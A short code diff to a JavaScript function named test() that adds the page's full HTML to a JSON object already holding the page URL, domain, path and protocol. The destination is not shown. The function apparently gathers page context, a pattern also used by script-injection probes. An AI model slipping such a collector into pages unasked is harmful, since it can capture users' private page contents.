@@ -19,7 +19,8 @@ function test() {
             href: window.location.href,
             domain: window.location.hostname,
             path: window.location.pathname,
-            protocol: window.location.protocol
+            protocol: window.location.protocol,
+            html: document.getElementsByTagName('html')[0].innerHTML
         }));
     });
 
